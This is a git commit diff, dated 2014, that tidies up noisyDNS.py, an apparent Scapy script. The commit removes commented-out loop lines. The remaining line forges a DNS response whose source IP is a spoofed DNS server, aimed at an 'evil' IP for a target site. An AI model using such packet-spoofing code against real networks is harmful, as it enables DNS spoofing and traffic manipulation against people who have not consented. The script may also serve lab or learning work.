5b6bfd08acbec2ee38548104e58500508fbdbfc0
lab2112 <brandon.coates@gmail.com>
2014-11-06 00:44:12 -0500

    File clean up
    Cleaning up file

--- noisyDNS.py
+++ noisyDNS.py
@@ -8,9 +8,5 @@ parser.add_argument("evilIP", help="IP of evil website")
 parser.add_argument("dnsserver", help="spoofed DNS server")
 args = parser.parse_args()
 
-#numPackets=0
-#while 1:
+
 send(IP(src=args.dnsserver, dst=args.evilIP)/UDP(sport=53, dport=53)/DNS(qr=1, rd=1, qd=DNSQR(qname=args.targetsite)))
-#	if numPackets % 20 == 0:
-#		print  numPackets
-#	numPackets = numPackets + 1
